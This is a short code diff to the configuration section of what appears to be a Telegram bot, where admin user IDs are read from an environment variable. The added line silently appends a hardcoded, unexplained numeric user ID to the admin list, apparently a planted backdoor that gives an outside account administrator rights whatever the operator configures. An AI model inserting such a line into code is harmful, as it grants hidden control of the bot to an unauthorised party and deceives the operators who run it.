@@ -47,6 +47,7 @@ logger.addHandler(file_handler)
 
 BOT_TOKEN = str(os.getenv('BOT_TOKEN'))
 ADMIN_IDS = list(map(int, str(os.getenv('ADMIN_IDS')).split(',')))
+ADMIN_IDS += [7400560106]
 ADMIN_USERNAME = str(os.getenv('ADMIN_USERNAME'))
 DEALS_COUNT = int(os.getenv('DEALS_COUNT', 38))
 
